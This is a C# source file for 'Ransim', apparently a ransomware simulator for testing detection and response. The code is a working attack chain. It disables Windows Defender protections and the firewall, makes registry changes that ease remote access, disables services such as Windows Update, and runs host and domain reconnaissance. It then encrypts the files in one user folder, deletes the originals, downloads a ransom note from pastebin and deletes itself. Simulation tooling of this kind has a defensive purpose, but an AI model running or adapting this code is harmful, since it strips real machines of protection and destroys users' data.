/*########################################################################################
# Title:        Ransim
# Author:       d4rk-d4nph3
# Description:  Ransomware Simulator
# Version:      0.2 (Dev)
# Released at:  xxxx/xx/xx
########################################################################################*/

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;

namespace Ransim
{
    class Program
    {
        public static bool IsAdministrator()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
                      .IsInRole(WindowsBuiltInRole.Administrator);
        }
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(data);
                }
            }
            return data;
        }

        static void FileEncrypt(string inputFile, string password)
        {

            //generate random salt
            byte[] salt = GenerateRandomSalt();

            //create output file name
            FileStream fsCrypt = new FileStream(inputFile + ".rsim", FileMode.Create);

            //convert password string to byte arrray
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            //Set Rijndael symmetric encryption algorithm
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            //http://stackoverflow.com/questions/2659214/why-do-i-need-to-use-the-rfc2898derivebytes-class-in-net-instead-of-directly
            //"What it does is repeatedly hash the user password along with the salt." High iteration counts.
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            //Cipher modes: http://security.stackexchange.com/questions/52665/which-is-the-best-cipher-mode-and-padding-mode-for-aes-encryption
            AES.Mode = CipherMode.CFB;

            // write salt to the begining of the output file, so in this case can be random every time
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, read);
                }

                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
            }
        }

        static void ManipulateRegistry()
        {
            // Enable Long Paths to avoid issues that may occur when encrypting files with long path names
            Process.Start("cmd.exe", @"/c REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f");

            // Disable UAC remote restrictions
            // See: 
            // 1. https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction
            // 2. https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167
            Process.Start("cmd.exe", @"/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");

            // Disable EnableLinkedConnections to force the symbolic links to be written to both linked logon sessions
            // This is useful because when drive mappings are created, the system creates symbolic link objects (DosDevices) that associate the drive letters to the UNC paths 
            // These objects are specific for a logon session and are not shared between logon sessions
            Process.Start("cmd.exe", @"/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System / v EnableLinkedConnections / t REG_DWORD / d 1 / f");
        }

        static void StopServices()
        {
            Process.Start(@"C:\Windows\System32\sc.exe", "config SQLTELEMETRY start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config SQLTELEMETRY$ECWDB2 start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config SQLWriter start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config SstpSvc start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config MBAMService start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config wuauserv start=disabled");
        }
        
        static void DisableFirewall()
        {
            Process.Start(@"C:\Windows\System32\netsh.exe", "advfirewall set allprofiles state off");
        }
        static void DisableAV()
        {
            // Disable Defender's Real-Time Monitoring
            Process.Start("powershell.exe", "-command Set-MpPreference -DisableRealtimeMonitoring 1");
            // Disable Defender's Controlled Folder Access
            Process.Start("powershell.exe", "-command Set-MpPreference -EnableControlledFolderAccess Disabled");
        }

        static void RunRecon()
        {
            // Runs a barrage of reconnaissance commands
            Process.Start("systeminfo.exe");
            Process.Start("whoami.exe", "/all");
            Process.Start("ipconfig.exe", "/all");
            Process.Start("route.exe", "print");
            Process.Start("net.exe", "user");
            Process.Start("arp.exe", "-a");
            Process.Start("net.exe", "share");
            Process.Start("net.exe", "view /all");
            Process.Start("net.exe", "view /all /domain");
            Process.Start("net.exe", "localgroup");
            Process.Start("net.exe", "config workstation");
            Process.Start("netstat.exe", "-ano");

            // Query installed AV
            Process.Start("wmic.exe", @"/Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List");

            // Query VMs on the system
            Process.Start("powershell.exe", "-command Get-VM");

            // AD Domain recon
            Process.Start("nltest.exe", "/domain_trusts");
            Process.Start("nltest.exe", "/domain_trusts /all_trusts");
            Process.Start("net.exe", "group 'Domain Admins' /domain");

            
        }
        static void RansomNoteDownload(string ransomNote)
        {
            WebClient client = new WebClient();
            const string pastebin_url = "https://pastebin.com/dl/AwQWBWkV";
            client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)");
            client.Headers.Add("referer", "https://pastebin.com");
            client.DownloadFile(pastebin_url, ransomNote);
        }

        static void LocationCheck()
        {
            string responseJSON = string.Empty;
            string url = @"https://ipinfo.io/json";

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.AutomaticDecompression = DecompressionMethods.GZip;

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (Stream stream = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(stream))
            {
                responseJSON = reader.ReadToEnd();
            }

            Console.WriteLine(responseJSON);
        }

        static void SelfDelete()
        {
            // Delete itself
            string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            Process.Start("cmd.exe", "/c ping 1.1.1.1 -n 5 > Nul & Del " + exePath + " /F /Q");
        }

        static void Main(string[] args)
        {
            const string targetDir = "Reports";
            const string ransomNote = "ransom_note.txt";
            const string tempDir = "11";
            const string randomPassword = "12345";
            string userDirPath = Environment.GetEnvironmentVariable("USERPROFILE");
            string targetDirPath = userDirPath + @"\" + targetDir;
            string[] files = Directory.GetFiles(targetDirPath, "*");

            string tempDirPath = userDirPath + @"\" + tempDir;

            // Check if Ransim was ran as Admin
            if (IsAdministrator() == false)
            {
                Console.WriteLine("Please run Ransim as administrator!");
                Console.WriteLine("Exiting...");
                return;
            }

            if (!Directory.Exists(targetDirPath))
            {
                // Precaution
                Console.WriteLine("Reports directory does not exist in USERPROFILE!!");
                Console.WriteLine("Exiting...");
                return;
            }

            //Run Location Check
            LocationCheck();

            RunRecon();

            DisableAV();

            DisableFirewall();

            // Runs a barrage of Registry manipulations commands
            ManipulateRegistry();
           
            StopServices();

            Console.WriteLine("Starting encryption process");
            // Iterate over files in the target directory for encryption.
            foreach (string file in files)
            {
                FileEncrypt(file, randomPassword);
                File.Delete(file);
            }

            Console.WriteLine("Downloading ransom note from pastebin.");
            // Download ransom note from Pastebin.
            RansomNoteDownload(ransomNote);

            // Open notepad to display the ransom note.
            Process.Start("notepad.exe", ransomNote);

            Console.WriteLine("Time for you to check your logs.");
            
            // Initiate Self Delete Procedure
            SelfDelete();
        }
    }
}
